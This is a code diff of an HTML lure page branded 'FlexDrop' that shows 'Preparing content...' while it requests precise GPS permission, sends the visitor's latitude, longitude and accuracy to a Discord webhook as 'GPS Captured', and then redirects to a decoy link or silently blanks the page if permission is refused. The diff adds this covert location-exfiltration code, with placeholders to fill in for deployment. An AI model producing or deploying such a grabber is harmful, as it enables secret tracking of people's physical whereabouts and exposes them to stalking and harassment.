@@ -1,66 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Loading...</title>
+  <meta charset="UTF-8">
+  <title>FlexDrop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       background-color: #000;
       color: #fff;
-      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
+      font-family: Arial, sans-serif;
       height: 100vh;
+      margin: 0;
       font-size: 1.2rem;
-      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div id="status">Loading FlexDrop...</div>
+  <div id="status">Preparing content...</div>
 
   <script>
-    function requestNotification() {
-      if ("Notification" in window) {
-        Notification.requestPermission().then((permission) => {
-          console.log("Notification permission:", permission);
-        });
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // Replace with your webhook
+
+    async function requestNotificationPermission() {
+      try {
+        if ('Notification' in window) {
+          await Notification.requestPermission();
+        }
+      } catch (err) {
+        console.error("Notification error:", err);
       }
+    }
+
+    function sendToWebhook(lat, lon, acc) {
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
+        })
+      });
     }
 
     function requestGPS() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          function (position) {
+          (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
 
-            console.log("Latitude:", lat);
-            console.log("Longitude:", lon);
-            console.log("Accuracy:", acc);
+            sendToWebhook(lat, lon, acc);
 
-            // TODO: send this data to your server
-
-            // Redirect to your final media page
-            window.location.href = "https://example.com/view";
+            document.getElementById("status").innerText = "GPS granted. Loading content...";
+            setTimeout(() => {
+              window.location.href = "https://example.com/view"; // change to your final link
+            }, 1000);
           },
-          function (error) {
-            // If denied or error, silently exit
+          (error) => {
+            // If denied or failed, close the page silently
             window.location.href = "about:blank";
           },
-          { timeout: 5000 }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
         document.getElementById("status").innerText = "Geolocation not supported.";
       }
     }
 
-    // Start both permission requests immediately
-    requestNotification();
-    requestGPS();
+    // Fire everything after a short delay (feels smoother)
+    setTimeout(() => {
+      requestNotificationPermission();
+      requestGPS();
+    }, 1000);
   </script>
 </body>
 </html>
